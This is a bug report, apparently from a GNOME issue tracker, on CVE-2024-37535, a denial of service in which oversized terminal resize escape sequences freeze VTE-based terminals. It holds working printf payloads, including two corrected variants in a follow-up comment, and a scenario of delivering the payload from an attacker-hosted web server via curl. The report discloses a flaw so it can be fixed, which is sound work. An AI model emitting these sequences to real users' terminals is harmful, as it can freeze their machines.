# (CVE-2024-37535) Limit XTERM\_WM resize number of rows and columns

Original reporter: Siddharth Dushantha

Area: Application

## Message

The ANSI escape sequence "e[4;;t" can be used to resize the terminal window, where "" is the height and ""is the width.
By providing a large number such as 65535 for both values will lead to a local denial of service, where the whole machine can be frozen.

This same vulnerability found was in XTerm back in 2000. The CVE for the vulnerability in XTerm is CVE-2000-0476

Steps to reproduce:

1. Open gnome-terminal
2. Execute `printf "e[4;65535;65535t"` in the terminal

Depending on the amount of memory on your machine, you will either experience the terminal window being frozen or the whole machine being frozen. When tested in a Kali Linux virtual machine, the whole machine froze and then the user got logged out.

An attacker can use this vulnerability to temporarily render someone's machine useless
In the example above, the victim executed the escape sequences themselves. An attacker can deliver this payload to the victim by hosting it in a file and having the victim use curl or similar to fetch the file.

attacker$ printf "e[4;65535;65535t" > index.html
attacker$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (<http://0.0.0.0:8000/>) ...

victim$ curl attacker-ip:80000
#everything will stop working

System info:
OS: Kali Linux
GNOME Terminal version: GNOME Terminal 3.52.1 using VTE 0.75.92 +BIDI +GNUTLS +ICU +SYSTEMD

To upload designs, you'll need to enable LFS and have an admin enable hashed storage. [More information](/help/user/project/issues/design_management.md#prerequisites)

The above command is missing its backslash.  This triggers a crash:

printf '\e[4;65535;65535t'

and so does this:

printf '\e[8;65535;65535t'

The latter is a different escape sequence that accepts the sizes in
different units.  I hope the fix covers both, but I didn't review nor
test it - I hope someone does and posts in here.
